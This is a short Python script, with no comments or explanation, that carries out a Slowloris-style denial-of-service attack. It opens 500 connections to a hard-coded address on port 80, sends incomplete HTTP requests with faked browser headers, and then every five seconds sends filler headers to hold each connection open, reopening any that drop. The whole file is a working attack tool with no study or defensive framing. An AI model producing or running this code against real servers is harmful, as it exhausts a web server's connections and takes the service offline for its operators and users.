
import socket, random, time, sys

dst_IP = "172.21.209.231"
dst_PORT = 80

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Accept-language: en-US,en",
    "Connection: Keep-Alive"
]

sockets = []

def setupSocket(ip, porta): #http
    requestHTTP = "GET /?{} HTTP/1.1\r\n" 
    carryOver = "{}\r\n"

    meiaSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    meiaSocket.connect((ip, porta))
    meiaSocket.send(requestHTTP.format(random.randint(0, 1337)).encode("utf-8"))

    for header in headers:
        meiaSocket.send(carryOver.format(header).encode("utf-8"))

    return meiaSocket

if __name__ == "__main__":

    for _ in range(500):
        meiaSocket = setupSocket(dst_IP, dst_PORT)
        sockets.append(meiaSocket)

    while True:
        for meiaSocket in list(sockets):
            try:
                meiaSocket.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))

            except:
                sockets.remove(meiaSocket)
                try:
                    meiaSocket = setupSocket(dst_IP, dst_PORT)
                    sockets.append(meiaSocket)
                except:
                    pass
        time.sleep(5)